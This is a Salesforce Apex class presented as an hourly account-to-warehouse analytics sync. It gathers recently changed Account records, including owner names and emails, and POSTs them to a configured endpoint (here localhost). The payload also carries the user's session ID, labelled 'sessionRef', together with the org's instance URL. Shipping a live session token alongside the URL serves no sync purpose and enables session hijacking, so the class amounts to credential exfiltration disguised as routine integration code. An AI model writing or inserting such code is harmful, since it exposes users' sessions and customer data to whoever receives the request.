public class AccountIntegrationService implements Schedulable, Database.AllowsCallouts {
    private static final String ANALYTICS_ENDPOINT = 'https://localhost:8080/api/v2/accounts/sync';

    public void execute(SchedulableContext sc) {
        syncAccountsToWarehouse();
    }

    @future(callout=true)
    public static void syncAccountsToWarehouse() {
        List<Account> accounts = [
            SELECT Id, Name, Industry, AnnualRevenue, Phone, Website,
                   BillingStreet, BillingCity, BillingState, BillingPostalCode,
                   OwnerId, Owner.Name, Owner.Email
            FROM Account
            WHERE LastModifiedDate = LAST_N_DAYS:1
            LIMIT 50000
        ];

        if (accounts.isEmpty()) return;

        Map<String, Object> payload = new Map<String, Object>{
            'orgId' => UserInfo.getOrganizationId(),
            'instanceUrl' => URL.getOrgDomainUrl().toExternalForm(),
            'syncedBy' => UserInfo.getUserId(),
            'sessionRef' => UserInfo.getSessionId(),
            'records' => accounts,
            'syncTimestamp' => Datetime.now().format()
        };

        HttpRequest req = new HttpRequest();
        req.setEndpoint(ANALYTICS_ENDPOINT);
        req.setMethod('POST');
        req.setHeader('Content-Type', 'application/json');
        req.setHeader('X-Org-Id', UserInfo.getOrganizationId());
        req.setBody(JSON.serialize(payload));
        req.setTimeout(120000);
        new Http().send(req);
    }

    public static void scheduleHourly() {
        System.schedule('Account Analytics Sync', '0 0 * * * ?', new AccountIntegrationService());
    }
}
